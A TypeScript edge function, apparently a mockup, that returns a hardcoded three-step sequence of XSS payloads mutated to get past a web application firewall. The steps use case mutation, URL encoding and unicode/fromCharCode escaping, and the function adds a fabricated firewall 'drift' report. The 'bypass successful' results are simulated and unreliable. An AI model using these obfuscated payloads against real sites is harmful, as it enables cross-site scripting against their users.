import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2.95.0/cors";

interface MutationStep {
  iteration: number;
  payload: string;
  httpStatus: number;
  httpStatusText: string;
  engineAction: string;
  timestamp: string;
  technique: string;
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const body = await req.json().catch(() => ({}));
    const endpoint = body.endpoint || "https://target.example.com/api/search";
    const basePayload = body.payload || "<script>alert(1)</script>";

    // Simulated 3-step mutation sequence (skeleton — no real AI logic)
    const now = Date.now();
    const steps: MutationStep[] = [
      {
        iteration: 1,
        payload: basePayload,
        httpStatus: 403,
        httpStatusText: "Forbidden",
        engineAction: "Blocked by WAF — signature matched. Initializing obfuscation routine.",
        technique: "raw",
        timestamp: new Date(now).toISOString(),
      },
      {
        iteration: 2,
        payload: "<ScRiPt>%61lert%281%29</ScRiPt>",
        httpStatusText: "Not Acceptable",
        httpStatus: 406,
        engineAction: "Applying Chunked Encoding + Case Mutation. Partial bypass detected.",
        technique: "case-mutation+url-encode",
        timestamp: new Date(now + 1200).toISOString(),
      },
      {
        iteration: 3,
        payload: "%3C%73%63%72%69%70%74%3E%5C%75%30%30%36%31lert%28String.fromCharCode%2849%29%29%3C%2Fscript%3E",
        httpStatus: 200,
        httpStatusText: "OK",
        engineAction: "Bypass Successful — heavy unicode + entity encoding accepted by origin.",
        technique: "unicode+fromCharCode+chunked",
        timestamp: new Date(now + 2400).toISOString(),
      },
    ];

    const driftReport = {
      endpoint,
      previousServer: "nginx/1.21.6",
      currentServer: "cloudflare",
      previousWaf: "ModSecurity",
      currentWaf: "Cloudflare WAF",
      driftDetected: true,
      driftType: "edge-provider-change",
      detectedAt: new Date().toISOString(),
    };

    return new Response(
      JSON.stringify({ ok: true, drift: driftReport, mutationChain: steps }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ ok: false, error: (err as Error).message }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 }
    );
  }
});
